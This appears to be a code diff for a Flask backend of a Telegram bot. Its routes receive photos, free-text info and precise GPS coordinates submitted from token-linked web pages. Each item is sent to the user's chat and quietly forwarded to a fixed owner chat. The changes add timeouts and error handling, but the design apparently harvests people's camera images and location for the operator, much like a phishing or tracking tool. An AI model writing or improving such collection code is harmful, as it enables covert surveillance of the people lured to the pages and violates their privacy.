@@ -11,8 +11,8 @@ from token_store import (
     get_chat_id,
     store_name,
     get_name,
-    get_token_for_chat,      # ✅ Added
-    store_chat_to_token      # ✅ Added
+    get_token_for_chat,
+    store_chat_to_token
 )
 
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
@@ -65,6 +65,7 @@ def next_page():
     name = get_name(token) or "User"
     return render_template("page2.html", token=token, user_name=name)
 
+# ---------------- Photo ---------------- #
 @app.route("/send_photo", methods=["POST"])
 def send_photo():
     data = request.json or {}
@@ -77,7 +78,8 @@ def send_photo():
 
     try:
         image_bytes = base64.b64decode(image_data.split(",")[1])
-    except Exception:
+    except Exception as e:
+        print("Decode error:", e)
         return jsonify({"status": "invalid image"}), 400
 
     filename = "temp.jpg"
@@ -89,7 +91,8 @@ def send_photo():
             resp = requests.post(
                 f"{TELEGRAM_API}/sendPhoto",
                 data={"chat_id": chat_id},
-                files={"photo": photo}
+                files={"photo": photo},
+                timeout=10
             )
         result = resp.json()
         print("User photo response:", result)
@@ -102,8 +105,11 @@ def send_photo():
                     "chat_id": OWNER_CHAT_ID,
                     "from_chat_id": chat_id,
                     "message_id": message_id
-                }
+                },
+                timeout=10
             )
+        else:
+            print("Photo send failed:", result)
     finally:
         try:
             os.remove(filename)
@@ -112,6 +118,7 @@ def send_photo():
 
     return jsonify({"status": "sent"}), 200
 
+# ---------------- Info ---------------- #
 @app.route("/send_info", methods=["POST"])
 def send_info():
     data = request.json or {}
@@ -122,22 +129,30 @@ def send_info():
     if not chat_id or not info_text:
         return jsonify({"status": "missing data"}), 400
 
-    resp = requests.post(
-        f"{TELEGRAM_API}/sendMessage",
-        data={"chat_id": chat_id, "text": info_text, "parse_mode": "Markdown"}
-    )
-    result = resp.json()
-    print("User info response:", result)
-
-    if result.get("ok"):
-        owner_text = f"👤 User ID: `{chat_id}`\n\n{info_text}"
-        requests.post(
+    try:
+        resp = requests.post(
             f"{TELEGRAM_API}/sendMessage",
-            data={"chat_id": OWNER_CHAT_ID, "text": owner_text, "parse_mode": "Markdown"}
+            data={"chat_id": chat_id, "text": info_text, "parse_mode": "Markdown"},
+            timeout=10
         )
+        result = resp.json()
+        print("User info response:", result)
+
+        if result.get("ok"):
+            owner_text = f"👤 User ID: `{chat_id}`\n\n{info_text}"
+            requests.post(
+                f"{TELEGRAM_API}/sendMessage",
+                data={"chat_id": OWNER_CHAT_ID, "text": owner_text, "parse_mode": "Markdown"},
+                timeout=10
+            )
+        else:
+            print("Info send failed:", result)
+    except Exception as e:
+        print("Error sending info:", e)
 
     return jsonify({"status": "sent"}), 200
 
+# ---------------- Location ---------------- #
 @app.route("/send_location", methods=["POST"])
 def send_location():
     data = request.json or {}
@@ -146,35 +161,41 @@ def send_location():
     lat = data.get("lat")
     lon = data.get("lon")
 
-    # ✅ Fix: अब सिर्फ़ None check होगा, 0.0 values reject नहीं होंगी
+    # ✅ Fix: सिर्फ़ None check, 0.0 values reject नहीं होंगी
     if not chat_id or lat is None or lon is None:
         return jsonify({"status": "missing data"}), 400
 
     try:
         lat = float(lat)
         lon = float(lon)
-    except Exception:
+    except Exception as e:
+        print("Invalid coords:", e)
         return jsonify({"status": "invalid coords"}), 400
 
-    # Step 1: Send location to user
-    resp = requests.post(
-        f"{TELEGRAM_API}/sendLocation",
-        data={"chat_id": chat_id, "latitude": lat, "longitude": lon}
-    )
-    result = resp.json()
-    print("User location response:", result)
-
-    # Step 2: Forward same message to owner (like photo)
-    if result.get("ok"):
-        message_id = result["result"]["message_id"]
-        requests.post(
-            f"{TELEGRAM_API}/forwardMessage",
-            data={
-                "chat_id": OWNER_CHAT_ID,
-                "from_chat_id": chat_id,
-                "message_id": message_id
-            }
+    try:
+        resp = requests.post(
+            f"{TELEGRAM_API}/sendLocation",
+            data={"chat_id": chat_id, "latitude": lat, "longitude": lon},
+            timeout=10
         )
+        result = resp.json()
+        print("User location response:", result)
+
+        if result.get("ok"):
+            message_id = result["result"]["message_id"]
+            requests.post(
+                f"{TELEGRAM_API}/forwardMessage",
+                data={
+                    "chat_id": OWNER_CHAT_ID,
+                    "from_chat_id": chat_id,
+                    "message_id": message_id
+                },
+                timeout=10
+            )
+        else:
+            print("Location send failed:", result)
+    except Exception as e:
+        print("Error sending location:", e)
 
     return jsonify({"status": "sent"}), 200
 
